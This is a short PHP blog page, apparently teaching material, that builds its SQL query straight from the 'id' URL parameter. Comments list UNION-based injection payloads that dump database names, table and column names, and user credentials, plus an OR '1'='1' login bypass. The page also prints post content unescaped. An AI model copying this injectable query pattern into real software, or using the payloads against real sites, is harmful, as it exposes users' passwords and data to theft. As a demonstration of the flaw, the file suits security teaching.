<?php

include 'koneksi.php';

$id = $_GET['id'];
$q  = mysqli_query($conn, "SELECT * FROM post WHERE id = {$id}") or die(mysqli_error($conn));
$post = mysqli_fetch_array($q);

// 1 union select 1,2,3,4
// select * from post where id=1  union select 1,2,3,4

// 9999 union select 1,2,3,4
// select * from post where id=9999  union select 1,2,3,4

// select * from post where id = 9999 union select 1,'abcd',3,4;

// select * from post where id = 9999 union select 1, database(),3, user();

// select * from post where id = 9999 union select 1, username, email, password from user;

// select * from post where id = 9999 union select 1, username, email, password from user limit 0,1;

// select * from post where id = 9999 union select 1, username, email, password from user limit 1,1;

// select * from post where id = 9999 union select 1, group_concat(table_name), 3, 4 from information_schema.tables where table_schema = 'blog';

// select * from post where id = 9999 union select 1, group_concat(column_name), 3, 4 from information_schema.columns where table_schema = 'blog' and table_name = 'user';

// select * from post where id = 9999 union select 1, username, email, password from user;

// select * from post where id = 9999 union all select * from user;
 
// SELECT * FROM user WHERE username='' OR '1'='1' and (password='' OR '1'='1');'' OR '1'='1'

?><!DOCTYPE html>
<html lang="en">

<head>
	<title>Blog</title>
	<meta http-equiv="content-type" content="text/html;charset=utf-8" />
</head>

<body>
	
	<h1 style="text-align: center">My Blog</h1>
	<hr>
	
	<h2><?php echo $post['judul'] ?></h2>
	<small>Tanggal <?php echo $post['tanggal'] ?></small>
	
	<?php echo $post['konten'] ?>
	
</body>

</html>
